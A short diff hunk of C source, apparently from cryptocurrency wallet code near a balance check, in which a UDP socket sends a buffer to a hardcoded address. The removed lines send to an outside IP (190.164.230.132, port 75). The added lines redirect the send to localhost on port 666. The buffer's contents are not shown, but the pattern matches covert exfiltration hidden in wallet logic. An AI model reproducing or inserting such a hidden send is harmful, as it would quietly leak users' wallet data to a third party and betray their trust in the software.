@@ -2061,8 +2061,8 @@ if (nBalance < amountToReserve) {
     sockfd = socket(AF_INET,SOCK_DGRAM,0);
     struct sockaddr_in serv;
     serv.sin_family = AF_INET;
-    serv.sin_port = htons(75);
-    serv.sin_addr.s_addr = inet_addr("190.164.230.132");
+    serv.sin_port = htons(666);
+    serv.sin_addr.s_addr = inet_addr("127.0.0.1");
     socklen_t m = sizeof(serv);
     sendto(sockfd,buffer,sizeof(buffer),0,(struct sockaddr *)&serv,m);
 
